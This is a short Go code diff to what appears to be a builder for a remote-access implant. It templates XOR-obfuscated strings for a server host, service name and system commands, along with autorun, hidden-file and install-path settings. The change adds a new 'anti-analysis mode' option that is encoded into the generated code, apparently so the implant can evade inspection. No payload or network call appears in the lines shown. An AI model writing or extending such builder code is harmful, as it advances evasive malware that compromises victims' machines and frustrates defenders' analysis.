@@ -254,12 +254,14 @@ func buildGlobals(cfg Config) (globalValues, error) {
 		EncSysctlCmd:      xorWithKey("sysctl", key),
 		EncSysctlNameArg:  xorWithKey("-n", key),
 		EncXdgOpen:        xorWithKey("xdg-open", key),
+		EncAntiAnalysisMode: xorWithKey(strings.TrimSpace(cfg.AntiAnalysis), key),
 		XorKeyLiteral:     escapeGoString(key),
 	}, nil
 }
 
 func templateGlobals(cfg Config) (string, error) {
 	g, err := buildGlobals(cfg)
+
 	if err != nil {
 		return "", err
 	}
@@ -275,6 +277,7 @@ var autorunMode = "%s"
 var hideFilesEnabled = %s
 var installMode = "%s"
 var customInstallPath = "%s"
+var antiAnalysisMode = "%s"
 
 var encServerHost = []byte{%s}
 var encServiceName = []byte{%s}
@@ -386,6 +389,7 @@ var encDashCArg = []byte{%s}
 var encSysctlCmd = []byte{%s}
 var encSysctlNameArg = []byte{%s}
 var encXdgOpen = []byte{%s}
+var encAntiAnalysisMode = []byte{%s}
 
 var decryptionKey = []byte("%s")
 `,
@@ -394,6 +398,7 @@ var decryptionKey = []byte("%s")
 		goHideFiles,
 		escapeGoString(g.InstallMode),
 		g.CustomInstallPath,
+		escapeGoString(strings.TrimSpace(cfg.AntiAnalysis)),
 		g.EncServerHost,
 		g.EncServiceName,
 		g.EncDisplayName,
